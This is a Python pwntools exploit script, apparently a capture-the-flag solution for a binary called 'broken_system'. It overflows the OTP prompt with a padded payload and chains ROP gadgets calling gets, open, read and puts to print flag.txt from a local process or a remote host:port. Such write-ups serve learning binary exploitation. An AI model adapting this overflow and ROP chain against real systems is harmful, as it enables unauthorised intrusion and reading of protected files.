#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('./broken_system')
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

p = conn()

pop_rdi = 0x0000000000402f90
pop_rsi = 0x0000000000410b72
pop_rdx_rbx = 0x0000000000487ea7

scratch = e.sym._IO_wide_data_2     # chosen arbitrarily

otp = b"A"*0x20

payload = otp.hex().encode() + b"\x00"
payload = payload.ljust(0x60, b"B")
payload += otp
payload += b"C"*0x10
payload += p64(0)   # rbp
# gets(scratch): read flag filename into memory
payload += p64(pop_rdi) + p64(scratch)
payload += p64(e.sym.gets)
# open(scratch, 0, 0)
payload += p64(pop_rdi) + p64(scratch)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0)*2
payload += p64(e.sym.open64)
# read(3, scratch, 0x100)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(scratch)
payload += p64(pop_rdx_rbx) + p64(0x100)*2
payload += p64(e.sym.read)
# puts(scratch)
payload += p64(pop_rdi) + p64(scratch)
payload += p64(e.sym.puts)
# exit(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(e.sym.exit)

assert b"\n" not in payload

p.sendlineafter(b"Enter username: ", b"admin")
p.sendlineafter(b"Welcome admin, please enter your OTP\n> ", payload)
p.sendline(b"flag.txt")

p.interactive()
